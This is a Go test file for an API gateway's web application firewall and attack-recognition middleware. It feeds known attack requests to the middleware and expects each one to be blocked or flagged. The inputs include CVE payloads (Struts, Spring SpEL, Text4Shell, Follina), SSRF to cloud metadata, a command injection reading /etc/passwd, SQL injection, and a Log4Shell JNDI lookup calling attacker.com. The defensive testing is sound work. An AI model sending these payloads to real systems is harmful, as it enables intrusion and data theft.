// Copyright (c) 2026 Gembit Soultan Shirazi <gembit.soultan@gmail.com>. All rights reserved.
// SPDX-License-Identifier: MIT

package middleware

import (
	"bytes"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"github.com/gsoultan/gateon/internal/db"
	"github.com/gsoultan/gateon/internal/security/waf"
	"github.com/gsoultan/gateon/internal/telemetry"
)

func TestWAF_SecurityV2(t *testing.T) {
	d, dialect, _ := db.Open("sqlite::memory:")
	_ = db.Migrate(d, dialect)
	store := waf.NewStore(d)
	if err := store.Seed(t.Context()); err != nil {
		t.Fatalf("failed to seed store: %v", err)
	}

	mw, err := WAF(WAFConfig{
		WafRules:         store,
		RequestBodyLimit: 1024 * 1024,
	})
	if err != nil {
		t.Fatalf("create WAF: %v", err)
	}

	handler := mw(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	tests := []struct {
		name       string
		method     string
		url        string
		headers    map[string]string
		body       []byte
		expectCode int
	}{
		{
			name:       "Apache Struts CVE-2023-50164: Path traversal in param name",
			method:     "POST",
			url:        "/upload.action?../shell.jsp=test",
			expectCode: http.StatusForbidden,
		},
		{
			name:       "Spring Cloud Gateway CVE-2022-22947: SpEL Injection",
			method:     "POST",
			url:        "/actuator/gateway/routes/test",
			body:       []byte(`{"filters": [{"name": "AddResponseHeader", "args": {"name": "X-Test", "value": "#{T(java.lang.Runtime).getRuntime().exec('id')}"}}]}`),
			expectCode: http.StatusForbidden,
		},
		{
			name:       "Text4Shell CVE-2022-42889: script lookup",
			method:     "GET",
			url:        "/?search=%24%7Bscript%3Ajavascript%3Ajava.lang.Runtime.getRuntime().exec('id')%7D",
			expectCode: http.StatusForbidden,
		},
		{
			name:       "Follina CVE-2022-30190: ms-msdt exploit",
			method:     "GET",
			url:        "/?q=ms-msdt%3A%2Fid%20IT_BrowseForFile%20%2F../../../../../../../../../../../../../../windows/system32/cmd.exe",
			expectCode: http.StatusForbidden,
		},
		{
			name:       "SSRF: Internal IP Metadata",
			method:     "GET",
			url:        "/?url=http://169.254.169.254/latest/meta-data/",
			expectCode: http.StatusForbidden,
		},
		{
			name:       "Prototype Pollution: Deep property",
			method:     "POST",
			url:        "/",
			body:       []byte(`{"__proto__": {"polluted": true}}`),
			expectCode: http.StatusForbidden,
		},
		{
			name:       "Sensitive File Discovery: .env",
			method:     "GET",
			url:        "/.env",
			expectCode: http.StatusForbidden,
		},
		{
			name:       "Advanced Shell Injection: cat /etc/passwd",
			method:     "GET",
			url:        "/?cmd=%3B%20cat%20%2Fetc%2Fpasswd",
			expectCode: http.StatusForbidden,
		},
		{
			name:       "AMP Spoofing: __amp_source_origin mismatch",
			method:     "GET",
			url:        "/?__amp_source_origin=https://attacker.com",
			headers:    map[string]string{"Host": "example.com"},
			expectCode: http.StatusForbidden,
		},
		{
			name:       "Unwanted Script: Coinhive miner",
			method:     "POST",
			url:        "/",
			body:       []byte(`{"script": "https://coinhive.min.js"}`),
			expectCode: http.StatusForbidden,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			var bodyReader *bytes.Buffer
			if tc.body != nil {
				bodyReader = bytes.NewBuffer(tc.body)
			} else {
				bodyReader = bytes.NewBuffer(nil)
			}
			req := httptest.NewRequest(tc.method, tc.url, bodyReader)
			for k, v := range tc.headers {
				req.Header.Set(k, v)
			}
			rr := httptest.NewRecorder()
			handler.ServeHTTP(rr, req)
			if rr.Code != tc.expectCode {
				t.Errorf("%s: expected status %d, got %d", tc.name, tc.expectCode, rr.Code)
			}
		})
	}
}

func TestRecognitionMiddlewares(t *testing.T) {
	// Initialize telemetry store
	dbPath := filepath.Join(t.TempDir(), "gateon_recognition_test.db")

	_ = telemetry.InitPathStatsStore(dbPath, 1)
	defer telemetry.ClosePathStatsStore(t.Context())

	var capturedThreats []telemetry.SecurityThreat
	var mu sync.Mutex
	telemetry.SetAlertingHandler(func(th *telemetry.SecurityThreat) {
		mu.Lock()
		defer mu.Unlock()
		capturedThreats = append(capturedThreats, *th)
	})
	defer telemetry.SetAlertingHandler(nil)

	handler := Chain(
		WithRequestState("test", "test", false),
		SQLiRecognition("test"),
		ThreatRecognition("test"),
	)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	tests := []struct {
		name       string
		url        string
		method     string
		body       string
		expectType string
	}{
		{
			name:       "SQLi in Query",
			url:        "/?id=1'+OR+1=1--",
			expectType: "sqli_detected",
		},
		{
			name:       "Prototype Pollution in Query",
			url:        "/?__proto__[polluted]=true",
			expectType: "generic_attack",
		},
		{
			name:       "Log4Shell in Header",
			url:        "/",
			expectType: "generic_attack",
		},
		{
			name:       "Shell Injection in Body",
			url:        "/",
			method:     "POST",
			body:       "; whoami",
			expectType: "generic_attack",
		},
		{
			name:       "Malicious Script in Body",
			url:        "/",
			method:     "POST",
			body:       "coinhive.min.js",
			expectType: "generic_attack",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			mu.Lock()
			capturedThreats = nil
			mu.Unlock()
			method := tc.method
			if method == "" {
				method = "GET"
			}
			req := httptest.NewRequest(method, tc.url, bytes.NewBufferString(tc.body))
			if tc.name == "Log4Shell in Header" {
				req.Header.Set("User-Agent", "${jndi:ldap://attacker.com/a}")
			}
			rr := httptest.NewRecorder()
			handler.ServeHTTP(rr, req)

			// Wait for background worker to process threat and call alerting handler.
			// Since threat recording is asynchronous, we need to allow some time.
			time.Sleep(500 * time.Millisecond)

			mu.Lock()
			threats := make([]telemetry.SecurityThreat, len(capturedThreats))
			copy(threats, capturedThreats)
			mu.Unlock()

			if len(threats) == 0 {
				t.Errorf("%s: expected threat to be captured, but none found", tc.name)
			} else {
				found := false
				for _, th := range threats {
					if th.Type == tc.expectType {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("%s: expected threat type %s, but got %v", tc.name, tc.expectType, threats)
				}
			}
		})
	}
}
